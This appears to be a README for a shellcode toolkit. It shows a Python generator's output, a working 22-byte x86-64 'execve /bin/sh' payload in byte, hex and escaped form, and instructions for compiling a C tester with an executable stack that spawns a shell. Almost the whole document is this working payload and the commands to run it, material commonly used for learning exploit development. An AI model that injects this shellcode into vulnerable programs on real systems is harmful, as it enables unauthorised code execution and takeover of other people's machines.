# Usage

## The shellcode python generator

It uses the simplest "execve /bin/sh" shellcode by default

```bash
python3 generate_shellcode.py
Shellcode: b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
Shellcode HEX: 31f65648bb2f62696e2f2f736853545ff7eeb03b0f05
Raw Shellcode: \x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05
Shellcode Length: 22 bytes
```

## The C payload tester

### Compilation
`gcc -o test_payload test_payload.c -z execstack`

### Run
```bash
./test_payload               

$ id
uid=1000(xtk)...
```
